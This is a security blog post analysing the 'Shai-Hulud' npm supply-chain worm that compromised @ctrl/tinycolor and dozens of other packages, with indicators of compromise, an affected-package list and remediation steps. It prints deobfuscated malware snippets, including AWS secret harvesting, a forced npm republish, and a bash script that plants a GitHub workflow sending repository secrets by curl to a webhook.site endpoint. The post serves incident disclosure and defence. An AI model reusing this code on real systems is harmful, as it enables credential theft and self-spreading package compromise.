---
title: ctrl/tinycolor and 40+ NPM Packages Compromised - StepSecurity
url: https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised
site_name: hackernews
fetched_at: '2025-09-16T19:06:04.464160'
original_url: https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised
author: jamesberthoty
date: '2025-09-16'
description: The popular @ctrl/tinycolor package with over 2 million weekly downloads has been compromised alongside 40+ other NPM packages in a sophisticated supply chain attack. The malware self-propagates across maintainer packages, harvests AWS/GCP/Azure credentials using TruffleHog, and establishes persistence through GitHub Actions backdoors - representing a major escalation in NPM ecosystem threats.
---

Back to Blog

News

# ctrl/tinycolor and 40+ NPM Packages Compromised

The popular @ctrl/tinycolor package with over 2 million weekly downloads has been compromised alongside 40+ other NPM packages in a sophisticated supply chain attack. The malware self-propagates across maintainer packages, harvests AWS/GCP/Azure credentials using TruffleHog, and establishes persistence through GitHub Actions backdoors - representing a major escalation in NPM ecosystem threats.
Ashish Kurmi
View LinkedIn

September 15, 2025

Share on X
Share on X
Share on LinkedIn
Share on Facebook
Follow our RSS feed

Table of Contents
Loading nav...

## Executive Summary

The NPM ecosystem is facing another critical supply chain attack. The popular @ctrl/tinycolor package, which receives over 2 million weekly downloads, has been compromised along with more than 40 other packages across multiple maintainers. This attack demonstrates a concerning evolution in supply chain threats - the malware includes a self-propagating mechanism that automatically infects downstream packages, creating a cascading compromise across the ecosystem. The compromised versions have been removed from npm.

In this post, we'll dive deep into the payload's mechanics, including deobfuscated code snippets, API call traces, and diagrams to illustrate the attack chain. Our analysis reveals a Webpack-bundled script (bundle.js) that leverages Node.js modules for reconnaissance, harvesting, and propagation; targeting Linux/macOS devs with access to NPM/GitHub/cloud creds.

## Community Office Hours

StepSecurity is hosting a community Office Hour on 16th September 1PM PST to help answer questions and support recovery efforts.

You can register here:https://us06web.zoom.us/meeting/register/UwZ9zAThQ-aQgOs4uFG8lw

## Technical Analysis

The attack unfolds through a sophisticated multi-stage chain that leverages Node.js's process.env for opportunistic credential access and employs Webpack-bundled modules for modularity. At the core of this attack is a ~3.6MB minified bundle.js file, which executes asynchronously during npm install. This execution is likely triggered via a hijacked postinstall script embedded in the compromised package.json.

Self-Propagation Engine‍

The malware includes a self-propagation mechanism through the NpmModule.updatePackage function. This function queries the NPM registry API to fetch up to 20 packages owned by the maintainer, then force-publishes patches to these packages. This creates a cascading compromise effect, recursively injecting the malicious bundle into dependent ecosystems across the NPM registry.

Credential Harvesting‍

The malware repurposes open-source tools like TruffleHog to scan the filesystem for high-entropy secrets. It searches for patterns such as AWS keys using regular expressions like AKIA[0-9A-Z]{16}. Additionally, the malware dumps the entire process.env, capturing transient tokens such as GITHUB_TOKEN and AWS_ACCESS_KEY_ID.

For cloud-specific operations, the malware enumerates AWS Secrets Manager using SDK pagination and accesses Google Cloud Platform secrets via the @google-cloud/secret-manager API. The malware specifically targets the following credentials:

1. GitHub personal access tokens
2. AWS access keys (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)
3. Google Cloud Platform service credentials
4. Azure credentials
5. Cloud metadata endpoints
6. NPM authentication tokens

Persistence Mechanism‍

The malware establishes persistence by injecting a GitHub Actions workflow file (.github/workflows/shai-hulud-workflow.yml) via a base64-encoded bash script. This workflow triggers on push events and exfiltrates repository secrets using the expression ${{ toJSON(secrets) }} to a command and control endpoint. The malware creates branches by force-merging from the default branch (refs/heads/shai-hulud) using GitHub's /git/refs endpoint.

Data Exfiltration‍

The malware aggregates harvested credentials into a JSON payload, which is pretty-printed for readability. It then uploads this data to a new public repository namedShai-Huludvia the GitHub /user/repos API.

The entire attack design assumes Linux or macOS execution environments, checking for os.platform() === 'linux' || 'darwin'. It deliberately skips Windows systems. For a visual breakdown, see the attack flow diagram below:

## Attack Mechanism

The compromise begins with a sophisticated minified JavaScript bundle injected into affected packages like @ctrl/tinycolor. This is not rudimentary malware but rather a sophisticated modular engine that uses Webpack chunks to organize OS utilities, cloud SDKs, and API wrappers.

The payload imports six core modules, each serving a specific function in the attack chain.

### OS Recon (Module 71197)

This module calls getSystemInfo() to build a comprehensive system profile containing platform, architecture, platformRaw, and archRaw information. It dumps the entire process.env, capturing sensitive environment variables including AWS_ACCESS_KEY_ID, GITHUB_TOKEN, and other credentials that may be present in the environment.

### Credential Harvesting Across Clouds

#### AWS (Module 56686)

The AWS harvesting module validates credentials using the STS AssumeRoleWithWebIdentityCommand. It then enumerates secrets using the @aws-sdk/client-secrets-manager library.

// Deobfuscated AWS harvest snippet

async

getAllSecretValues
(
)
 {


const
 secrets = [];


let
 nextToken;


do
 {


const
 resp =
await
 client.send(
new
 ListSecretsCommand({
NextToken
: nextToken }));


for
 (
const
 secret
of
 resp.SecretList || []) {


const
 value =
await
 client.send(
new
 GetSecretValueCommand({
SecretId
: secret.ARN }));

 secrets.push({
ARN
: secret.ARN,
SecretString
: value.SecretString,
SecretBinary
: atob(value.SecretBinary) });
// Base64 decode binaries

 }

 nextToken = resp.NextToken;

 }
while
 (nextToken);


return
 secrets;

}

The module handles errors such as DecryptionFailure or ResourceNotFoundException silently through decorateServiceException wrappers. It targets all AWS regions via endpoint resolution.

#### GCP (Module 9897)‍

The GCP module uses @google-cloud/secret-manager to list secrets matching the pattern projects//secrets/. It implements pagination using nextPageToken and returns objects containing the secret name and decoded payload. The module fails silently on PERMISSION_DENIED errors without alerting the user.

#### Filesystem Secret Scanning (Module 94913)

This module spawns TruffleHog via child_process.exec('trufflehog filesystem / --json') to scan the entire filesystem. It parses the output for high-entropy matches, such as AWS keys found in ~/.aws/credentials.

### Propagation Mechanics

#### NPM Pivot (Module 40766)

The NPM propagation module parses NPM_TOKEN from either ~/.npmrc or environment variables. After validating the token via the /whoami endpoint, it queries /v1/search?text=maintainer:${username}&size=20 to retrieve packages owned by the maintainer.

// Deobfuscated NPM update snippet

async

updatePackage
(
pkg
)
 {


// Patch package.json (add self as dep?) and publish


await
 exec(
`npm version patch --force && npm publish --access public --token
${token}
`
);

}

This creates a cascading effect where an infected package leads to compromised maintainer credentials, which in turn infects all other packages maintained by that user.

#### GitHub Backdoor (Module 82036)‍

The GitHub backdoor module authenticates via the /user endpoint, requiring repo and workflow scopes. After listing organizations, it injects malicious code via a bash script (Module 941).

Here is the line-by-line bash script deconstruction:

# Deobfuscated Code snippet

#!/bin/bash

GITHUB_TOKEN=
"
$1
"

BRANCH_NAME=
"shai-hulud"

FILE_NAME=
".github/workflows/shai-hulud-workflow.yml"

FILE_CONTENT=$(cat <<
'EOF'

on: push
# Trigger on any push

jobs
: process

 runs-on: ubuntu-latest

 steps:

 - run: curl -d
"
$CONTENTS
"
 https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7;
# C2 exfil


echo

"
$CONTENTS
"
 | base64 -w 0 | base64 -w 0
# Double-base64 for evasion

 env: CONTENTS:
${{ toJSON(secrets) }
}
# Dumps all repo secrets (GITHUB_TOKEN, AWS keys, etc.)

EOF

)

github_api
() { curl -s -X
"
$1
"
 -H
"Authorization: token
$GITHUB_TOKEN
"
 ...
"$API_BASE
$2
"
 }

REPOS_RESPONSE=$(github_api GET
"/user/repos?affiliation=owner,collaborator,organization_member&since=2025-01-01T00:00:00Z&per_page=100"
)

while
 IFS=
read
 -r repo;
do


# Get default branch SHA

 REF_RESPONSE=$(github_api GET
"/repos/
$REPO_FULL_NAME
/git/ref/heads/
$DEFAULT_BRANCH
"
)

 BASE_SHA=$(jq -r
'.object.sha'
 <<<
"
$REF_RESPONSE
"
)

 BRANCH_DATA=$(jq -n
'{ref: "refs/heads/shai-hulud", sha: "$BASE_SHA"}'
)

 github_api POST
"/repos/
$REPO_FULL_NAME
/git/refs"

"
$BRANCH_DATA
"

# Handles "already exists" gracefully

 FILE_DATA=$(jq -n
'{message: "Add workflow", content: "$(base64 <<< "$FILE_CONTENT")", branch: "shai-hulud"}'
)

 github_api PUT
"/repos/
$REPO_FULL_NAME
/contents/
$FILE_NAME
"

"
$FILE_DATA
"

# Overwrites if exists

done

This mechanism ensures persistence, as secrets are exfiltrated to the command and control server on the next push event.

### Exfiltration‍

The malware builds a comprehensive JSON payload containing system information, environment variables, and data from all modules. It then creates a public repository via the GitHub /repos POST endpoint using the functionmakeRepo('Shai-Hulud'). The repository is public by default to ensure easy access for the command and control infrastructure.

We are observing hundreds of such public repositories containing exfiltrated credentials. AGitHub search for "Shai-Hulud" repositoriesreveals the ongoing and widespread nature of this attack, with new repositories being created as more systems execute the compromised packages.

This exfiltration technique is similar to theNx supply chain attack we analyzed previously, where attackers also used public GitHub repositories to exfiltrate stolen credentials. This pattern of using GitHub as an exfiltration endpoint appears to be a preferred method for supply chain attackers, as it blends in with normal developer activity and bypasses many traditional security controls.

These repositories contain sensitive information. The public nature of these repositories means that any attacker can access and potentially misuse these credentials, creating a secondary risk beyond the initial compromise.

The attack employs several evasion techniques including silent error handling (swallowed via catch {} blocks), no logging output, and disguising TruffleHog execution as a legitimate "security scan."

### Runtime Analysis with Harden-Runner

We analyzed the malicious payload usingStepSecurity Harden-Runnerin a GitHub Actions workflow. Harden-Runner successfully flagged the suspicious behavior as anomalous. The public insights from this test reveal how the payload works:

https://app.stepsecurity.io/github/actions-security-demo/compromised-packages/actions/runs/17774800387

* The compromised package made unauthorized API calls toapi.github.comandregistry.npmjs.orgduring the npm install process
* These API interactions were flagged as anomalous since legitimate package installations should not be making such external API calls

These runtime detections confirm the sophisticated nature of the attack, with the malware attempting credential harvesting, self-propagation to other packages, and data exfiltration - all during what appears to be a routine package installation.

‍

## Indicators of Compromise

The following indicators can help identify systems affected by this attack:

### GitHub Search Queries for Detection

Use these GitHub search queries to identify potentially compromised repositories across your organization:

#### Search for malicious workflow file

ReplaceACMEwith your GitHub organization name and use the following GitHub search query to discover all instance ofshai-hulud-workflow.ymlin your GitHub environment.

https://github.com/search?q=org%3AACME+path%3A**%2Fshai-hulud-workflow.yml&type=code

#### Search for malicious branch

To find malicious branches, you can use the following Bash script:

# List all repos and check for shai-hulud branch

gh repo list YOUR_ORG_NAME --
limit
 1000 --json nameWithOwner --jq
'.[].nameWithOwner'
 |
while

read
 repo;
do

 gh api
"repos/
$repo
/branches"
 --jq
'.[] | select(.name == "shai-hulud") | "'
$repo
' has branch: " + .name'

done

### File Hashes

* The malicious bundle.js file has a SHA-256 hash of:46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09

### Network Indicators

* Exfiltration endpoint:https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7

### File System Indicators

* Presence of malicious workflow file:.github/workflows/shai-hulud-workflow.yml

### Suspicious Function Calls

* Calls toNpmModule.updatePackagefunction

### Suspicious API Calls

* AWS API calls tosecretsmanager.*.amazonaws.comendpoints, particularlyBatchGetSecretValueCommand
* GCP API calls tosecretmanager.googleapis.com
* NPM registry queries toregistry.npmjs.org/v1/search
* GitHub API calls toapi.github.com/repos

### Suspicious Process Executions

* TruffleHog execution with argumentsfilesystem /
* NPM publish commands with--forceflag
* Curl commands targeting webhook.site domains

## Affected Packages

The following packages have been confirmed as compromised:

## NPM Packages and Versions

Package Name

Version(s)

angulartics2

14.1.2, 14.1.1

@ctrl/deluge

7.2.2, 7.2.1

@ctrl/golang-template

1.4.3, 1.4.2

@ctrl/magnet-link

4.0.4, 4.0.3

@ctrl/ngx-codemirror

7.0.2, 7.0.1

@ctrl/ngx-csv

6.0.2, 6.0.1

@ctrl/ngx-emoji-mart

9.2.2, 9.2.1

@ctrl/ngx-rightclick

4.0.2, 4.0.1

@ctrl/qbittorrent

9.7.2, 9.7.1

@ctrl/react-adsense

2.0.2, 2.0.1

@ctrl/shared-torrent

6.3.2, 6.3.1

@ctrl/tinycolor

4.1.1, 4.1.2

@ctrl/torrent-file

4.1.2, 4.1.1

@ctrl/transmission

7.3.1

@ctrl/ts-base32

4.0.2, 4.0.1

json-rules-engine-simplified

0.2.4, 0.2.1

koa2-swagger-ui

5.11.2, 5.11.1

@nativescript-community/gesturehandler

2.0.35

@nativescript-community/sentry

4.6.43

@nativescript-community/text

1.6.13, 1.6.9, 1.6.10, 1.6.11, 1.6.12

@nativescript-community/ui-collectionview

6.0.6

@nativescript-community/ui-drawer

0.1.30

@nativescript-community/ui-image

4.5.6

@nativescript-community/ui-material-bottomsheet

7.2.72

@nativescript-community/ui-material-core

7.2.76, 7.2.72, 7.2.73, 7.2.74, 7.2.75

@nativescript-community/ui-material-core-tabs

7.2.76, 7.2.72, 7.2.73, 7.2.74, 7.2.75

ngx-color

10.0.2, 10.0.1

ngx-toastr

19.0.2, 19.0.1

ngx-trend

8.0.1

react-complaint-image

0.0.35, 0.0.32

react-jsonschema-form-conditionals

0.3.21, 0.3.18

react-jsonschema-form-extras

1.0.4

rxnt-authentication

0.0.6, 0.0.5, 0.0.3, 0.0.4

rxnt-healthchecks-nestjs

1.0.2, 1.0.3, 1.0.4, 1.0.5

rxnt-kue

1.0.4, 1.0.5, 1.0.6, 1.0.7

swc-plugin-component-annotate

1.9.2, 1.9.1

ts-gaussian

3.0.6, 3.0.5

@art-ws/common

2.0.28, 2.0.22

@art-ws/config-eslint

2.0.5, 2.0.4

@art-ws/config-ts

2.0.8, 2.0.7

@art-ws/db-context

2.0.24, 2.0.21

@art-ws/di

2.0.32, 2.0.28

@art-ws/di-node

2.0.13

@art-ws/eslint

1.0.6, 1.0.5

@art-ws/fastify-http-server

2.0.27, 2.0.24

@art-ws/http-server

2.0.25, 2.0.21

@art-ws/openapi

0.1.12, 0.1.9

@art-ws/package-base

1.0.6, 1.0.5

@art-ws/prettier

1.0.6, 1.0.5

@art-ws/slf

2.0.22, 2.0.15

@art-ws/ssl-info

1.0.10, 1.0.9

@art-ws/web-app

1.0.4, 1.0.3

@hestjs/core

0.2.1

@hestjs/cqrs

0.1.6

@hestjs/demo

0.1.2

@hestjs/eslint-config

0.1.2

@hestjs/logger

0.1.6

@hestjs/scalar

0.1.7

@hestjs/validation

0.1.6

@nexe/config-manager

0.1.1

@nexe/eslint-config

0.1.1

@nexe/logger

0.1.3

@operato/board

9.0.51, 9.0.50, 9.0.49, 9.0.48, 9.0.47, 9.0.46, 9.0.45, 9.0.44, 9.0.43, 9.0.42, 9.0.41, 9.0.40, 9.0.39, 9.0.38, 9.0.37, 9.0.36, 9.0.35

@operato/data-grist

9.0.37, 9.0.36, 9.0.35, 9.0.29

@operato/graphql

9.0.51, 9.0.50, 9.0.49, 9.0.48, 9.0.47, 9.0.46, 9.0.45, 9.0.44, 9.0.43, 9.0.42, 9.0.41, 9.0.40, 9.0.39, 9.0.38, 9.0.37, 9.0.36, 9.0.35, 9.0.22

@operato/headroom

9.0.37, 9.0.36, 9.0.35, 9.0.2

@operato/help

9.0.51, 9.0.50, 9.0.49, 9.0.48, 9.0.47, 9.0.46, 9.0.45, 9.0.44, 9.0.43, 9.0.42, 9.0.41, 9.0.40, 9.0.39, 9.0.38, 9.0.37, 9.0.36, 9.0.35

@operato/i18n

9.0.37, 9.0.36, 9.0.35

@operato/input

9.0.48, 9.0.47, 9.0.46, 9.0.45, 9.0.44, 9.0.43, 9.0.42, 9.0.41, 9.0.40, 9.0.39, 9.0.38, 9.0.37, 9.0.36, 9.0.35, 9.0.27

@operato/layout

9.0.37, 9.0.36, 9.0.35

@operato/popup

9.0.50, 9.0.49, 9.0.48, 9.0.47, 9.0.46, 9.0.45, 9.0.44, 9.0.43, 9.0.42, 9.0.41, 9.0.40, 9.0.39, 9.0.38, 9.0.37, 9.0.36, 9.0.35, 9.0.22

@operato/pull-to-refresh

9.0.47, 9.0.46, 9.0.45, 9.0.44, 9.0.43, 9.0.42, 9.0.41, 9.0.40, 9.0.39, 9.0.38, 9.0.37, 9.0.36, 9.0.35

@operato/shell

9.0.39, 9.0.38, 9.0.37, 9.0.36, 9.0.35, 9.0.22

@operato/styles

9.0.37, 9.0.36, 9.0.35, 9.0.2

@operato/utils

9.0.51, 9.0.50, 9.0.49, 9.0.48, 9.0.47, 9.0.46, 9.0.45, 9.0.44, 9.0.43, 9.0.42, 9.0.41, 9.0.40, 9.0.39, 9.0.38, 9.0.37, 9.0.36, 9.0.35, 9.0.22

@teselagen/bounce-loader

0.3.17, 0.3.16

@teselagen/liquibase-tools

0.4.1

@teselagen/range-utils

0.3.15, 0.3.14

@teselagen/react-list

0.8.20, 0.8.19

@teselagen/react-table

6.10.22, 6.10.20, 6.10.19

@thangved/callback-window

1.1.4

@things-factory/attachment-base

9.0.50, 9.0.49, 9.0.48, 9.0.47, 9.0.46, 9.0.45, 9.0.44, 9.0.43, 9.0.42

@things-factory/auth-base

9.0.45, 9.0.44, 9.0.43, 9.0.42

@things-factory/email-base

9.0.54, 9.0.53, 9.0.52, 9.0.51, 9.0.50, 9.0.49, 9.0.48, 9.0.47, 9.0.46, 9.0.45, 9.0.44, 9.0.43, 9.0.42

@things-factory/env

9.042, 9.043, 9.044, 9.045

@things-factory/integration-base

9.042, 9.043, 9.044, 9.045

@things-factory/integration-marketplace

9.042, 9.043, 9.044, 9.045

@things-factory/shell

9.042, 9.043, 9.044, 9.045

@tnf-dev/api

1.0.8

@tnf-dev/core

1.0.8

@tnf-dev/js

1.0.8

@tnf-dev/mui

1.0.8

@tnf-dev/react

1.0.8

@ui-ux-gang/devextreme-angular-rpk

24.1.7

@yoobic/yobi

8.7.53

@yoobic/jpeg-camera-es6

1.0.13

airchief

0.3.1

airpilot

0.8.8

capacitor-notificationhandler

0.0.3, 0.0.2

capacitor-plugin-healthapp

0.0.3, 0.0.2

capacitor-plugin-ihealth

1.1.9, 1.1.8

capacitor-plugin-vonage

1.0.3, 1.0.2

capacitorandroidpermissions

0.0.5, 0.0.4

create-hest-app

0.1.9

db-evo

1.1.5, 1.1.4

devextreme-angular-rpk

21.2.8

eslint-config-teselagen

6.1.8, 6.1.7

globalize-rpk

1.7.4

graphql-sequelize-teselagen

5.3.9, 5.3.8

jumpgate

0.0.2

mcp-knowledge-graph

1.2.1

mstate-angular

0.4.4

mstate-cli

0.4.7

mstate-dev-react

1.1.1

mstate-react

1.6.5

ngx-bootstrap

20.0.4, 20.0.5, 20.0.6, 19.0.3, 18.1.4

ngx-ws

1.1.6, 1.1.5

oradm-to-gql

35.0.15, 35.0.14

oradm-to-sqlz

1.1.5, 1.1.2

ove-auto-annotate

0.0.10, 0.0.9

pm2-gelf-json

1.0.5, 1.0.4

tbssnch

1.0.2

teselagen-interval-tree

1.1.2

tg-client-query-builder

2.14.5, 2.14.4

tg-redbird

1.3.2, 1.3.1

tg-seq-gen

1.0.10, 1.0.9

ts-imports

1.0.2, 1.0.1

tvi-cli

0.1.5

ve-bamreader

0.2.7, 0.2.6

ve-editor

1.0.2, 1.0.1

voip-callkit

1.0.3, 1.0.2

wdio-web-reporter

0.1.3

yargs-help-output

5.0.3

yoo-styles

6.0.326

@ahmedhfarag/ngx-perfect-scrollbar

20.0.20

@ahmedhfarag/ngx-virtual-scroller

4.0.4

@crowdstrike/commitlint

8.1.1, 8.1.2

@crowdstrike/falcon-shoelace

0.4.1, 0.4.2

@crowdstrike/foundry-js

0.19.1, 0.19.2

@crowdstrike/glide-core

0.34.2, 0.34.3

@crowdstrike/logscale-dashboard

1.205.1, 1.205.2

@crowdstrike/logscale-file-editor

1.205.1, 1.205.2

@crowdstrike/logscale-parser-edit

1.205.1, 1.205.2

@crowdstrike/logscale-search

1.205.1, 1.205.2

@crowdstrike/tailwind-toucan-base

5.0.1, 5.0.2

@nativescript-community/arraybuffers

1.1.6, 1.1.7, 1.1.8

@nativescript-community/perms

3.0.5, 3.0.6, 3.0.7, 3.0.8

@nativescript-community/sqlite

3.5.2, 3.5.3, 3.5.4, 3.5.5

@nativescript-community/typeorm

0.2.30, 0.2.31, 0.2.32, 0.2.33

@nativescript-community/ui-document-picker

1.1.27, 1.1.28

@nativescript-community/ui-label

1.3.35, 1.3.36, 1.3.37

@nativescript-community/ui-material-bottom-navigation

7.2.72, 7.2.73, 7.2.74, 7.2.75

@nativescript-community/ui-material-ripple

7.2.72, 7.2.73, 7.2.74, 7.2.75

@nativescript-community/ui-material-tabs

7.2.72, 7.2.73, 7.2.74, 7.2.75

@nativescript-community/ui-pager

14.1.36, 14.1.37, 14.1.38

@nativescript-community/ui-pulltorefresh

2.5.4, 2.5.5, 2.5.6, 2.5.7

@nstudio/angular

20.0.4, 20.0.5, 20.0.6

@nstudio/focus

20.0.4, 20.0.5, 20.0.6

@nstudio/nativescript-checkbox

2.0.6, 2.0.7, 2.0.8, 2.0.9

@nstudio/nativescript-loading-indicator

5.0.1, 5.0.2, 5.0.3, 5.0.4

@nstudio/ui-collectionview

5.1.11, 5.1.12, 5.1.13, 5.1.14

@nstudio/web

20.0.4

@nstudio/web-angular

20.0.4

@nstudio/xplat

20.0.5, 20.0.6, 20.0.7

@nstudio/xplat-utils

20.0.5, 20.0.6, 20.0.7

browser-webdriver-downloader

3.0.8

config-cordova

0.8.5

cordova-plugin-voxeet2

1.0.24

cordova-voxeet

1.0.32

ember-browser-services

5.0.2, 5.0.3

ember-headless-form

1.1.2, 1.1.3

ember-headless-form-yup

1.0.1

ember-headless-table

2.1.5, 2.1.6

ember-url-hash-polyfill

1.0.12, 1.0.13

ember-velcro

2.2.1, 2.2.2

encounter-playground

0.0.2, 0.0.3, 0.0.4, 0.0.5

eslint-config-crowdstrike

11.0.2, 11.0.3

eslint-config-crowdstrike-node

4.0.4, 4.0.3

html-to-base64-image

1.0.2

mcfly-semantic-release

1.3.1

mcp-knowledge-base

0.0.2

mobioffice-cli

1.0.3

monorepo-next

13.0.1, 13.0.2

ng2-file-upload

7.0.2, 7.0.3, 8.0.1, 8.0.2, 8.0.3, 9.0.1

printjs-rpk

1.6.1

remark-preset-lint-crowdstrike

4.0.1, 4.0.2

thangved-react-grid

1.0.3

## Immediate Actions Required

If you use any of the affected packages, take these actions immediately:

### Identify and Remove Compromised Packages

# Check for affected packages in your project

npm ls @ctrl/tinycolor

# Remove compromised packages

npm uninstall @ctrl/tinycolor

# Search for the known malicious bundle.js by hash

find . -
type
 f -name
"*.js"
 -
exec
 sha256sum {} \; | grep
"46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09"

‍

### Clean Infected Repositories

#### Remove Malicious GitHub Actions Workflow

# Check for and remove the backdoor workflow

rm -f .github/workflows/shai-hulud-workflow.yml

# Look for suspicious 'shai-hulud' branches in all repositories

git ls-remote --heads origin | grep shai-hulud

# Delete any malicious branches found

git push origin --delete shai-hulud

‍

### Rotate All Credentials Immediately

The malware harvests credentials from multiple sources. Rotate ALL of the following:

* NPM tokens (automation and publish tokens)
* GitHub personal access tokens
* GitHub Actions secrets in all repositories
* SSH keys used for Git operations
* AWS IAM credentials, access keys, and session tokens
* Google Cloud service account keys and OAuth tokens
* Azure service principals and access tokens
* Any credentials stored in AWS Secrets Manager or GCP Secret Manager
* API keys found in environment variables
* Database connection strings
* Third-party service tokens
* CI/CD pipeline secrets

### Audit Cloud Infrastructure for Compromise

Since the malware specifically targets AWS Secrets Manager and GCP Secret Manager, you need to audit your cloud infrastructure for unauthorized access. The malware uses API calls to enumerate and exfiltrate secrets, so reviewing audit logs is critical to understanding the scope of compromise.

#### AWS Security Audit

Start by examining your CloudTrail logs for any suspicious secret access patterns. Look specifically for BatchGetSecretValue, ListSecrets, and GetSecretValue API calls that occurred during the time window when the compromised package may have been installed. Also generate and review IAM credential reports to identify any unusual authentication patterns or newly created access keys.

# Check CloudTrail for suspicious secret access

aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=BatchGetSecretValue

aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ListSecrets

aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue

# Review IAM credential reports for unusual activity

aws iam get-credential-report --query
'Content'

#### GCP Security Audit

For Google Cloud Platform, review your audit logs for any access to the Secret Manager service. The malware uses the @google-cloud/secret-manager library to enumerate secrets, so look for unusual patterns of secret access. Additionally, check for any unauthorized service account key creation, as these could be used for persistent access.

# Review secret manager access logs

gcloud logging read
"resource.type=secretmanager.googleapis.com"
 --limit=
50
 --format=json

# Check
for
 unauthorized service account key creation

gcloud logging read
"protoPayload.methodName=google.iam.admin.v1.CreateServiceAccountKey"

### Monitor for Active Exploitation

#### Network Monitoring

* Block outbound connections towebhook.sitedomains immediately
* Monitor firewall logs for connections tohttps://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7

### Implement Security Controls

#### GitHub Security Hardening

* Review and remove unnecessary GitHub Apps and OAuth applications
* Audit all repository webhooks for unauthorized additions
* Check deploy keys and repository secrets for all projects
* Enable branch protection rules to prevent force-pushes
* Turn on GitHub Secret Scanning alerts
* Enable Dependabot security updates

#### Ongoing Monitoring

* Set up alerts for any new npm publishes from your organization
* Monitor CloudTrail/GCP audit logs for secret access patterns
* Implement regular credential rotation policies
* Use separate, limited-scope tokens for CI/CD pipelines

‍

### For StepSecurity Enterprise Customers

The following steps are applicable only for StepSecurity enterprise customers. If you are not an existing enterprise customer, you can start our 14 day free trial by installingthe StepSecurity GitHub Appto complete the following recovery step.

#### ‍Use NPM Package Cooldown Check

The NPM Cooldown checkautomatically fails a pull request if it introduces an npm package version that was released within the organization’s configured cooldown period (default: 2 days). Once the cooldown period has passed, the check will clear automatically with no action required. The rationale is simple - most supply chain attacks are detected within the first 24 hours of a malicious package release, and the projects that get compromised are often the ones that rushed to adopt the version immediately. By introducing a short waiting period before allowing new dependencies, teams can reduce their exposure to fresh attacks while still keeping their dependencies up to date.Here is an example showing how this check protected a project from using the compromised versions of packages involved in this incident:

https://github.com/step-security/test-reporting/pull/16/checks?check_run_id=49850926488

#### Discover Pull Requests upgrading to compromised npm packages

We have added a new control specifically to detect pull requests that upgraded to these compromised packages. You can find the new control on the StepSecurity dashboard.

‍

#### Use StepSecurity Harden-Runner to detect compromised dependencies in CI/CD

StepSecurity Harden-Runner adds runtime security monitoring to your GitHub Actions workflows, providing visibility into network calls, file system changes, and process executions during CI/CD runs. Harden-Runner detects the compromised nx packages when they are used in CI/CD. Here is a sample Harden-Runner insights page demonstrating this detection:

https://app.stepsecurity.io/github/actions-security-demo/compromised-packages/actions/runs/17259145119

If you're already using Harden-Runner, we strongly recommend you review recent anomaly detections in your Harden-Runner dashboard. You can get started with Harden-Runner by following the guide athttps://docs.stepsecurity.io/harden-runner.

#### Use StepSecurity Artifact Monitor to detect software releases outside of authorized pipelines

StepSecurity Artifact Monitor provides real-time detection of unauthorized package releases by continuously monitoring your artifacts across package registries. This tool would have flagged this incident by detecting that the compromised versions were published outside of the project's authorized CI/CD pipeline. The monitor tracks release patterns, verifies provenance, and alerts teams when packages are published through unusual channels or from unexpected locations. By implementing Artifact Monitor, organizations can catch supply chain compromises within minutes rather than hours or days, significantly reducing the window of exposure to malicious packages.

Learn more about implementing Artifact Monitor in your security workflow athttps://docs.stepsecurity.io/artifact-monitor.

## Acknowledgements

* The npm security team and package maintainers for their swift response to this incident.
* @franky47, who promptly notified the community through aGitHub issue
* Daniel dos Santos Pereira forflagging suspicious behavior in a LinkedIn post.

The collaborative efforts of security researchers, maintainers, and community members continue to be essential in defending against supply chain attacks.

## Reference

GitHub Issue

Socket.dev Blog Post

‍
